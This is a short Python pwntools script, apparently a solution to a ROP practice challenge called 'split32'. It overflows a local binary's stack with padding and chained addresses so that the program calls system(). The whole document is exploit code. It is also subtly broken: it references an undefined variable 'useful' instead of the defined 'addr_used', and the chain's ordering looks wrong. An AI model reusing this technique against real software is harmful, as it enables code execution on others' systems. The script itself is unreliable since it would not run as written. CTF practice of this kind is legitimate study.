from pwn import *

fpath = "./split32"
offset = 0x2c

p = process(fpath)
elf = ELF(fpath)

addr_used	= 0x0804A030
system_plt 	= elf.symbols["system"]
main        = elf.symbols["main"]
payload 	= offset * 'A' + p32(useful) + p32(system_plt) + p32(1) + p32(addr_used)

p.recv()
p.sendline(payload)
print p.recv()

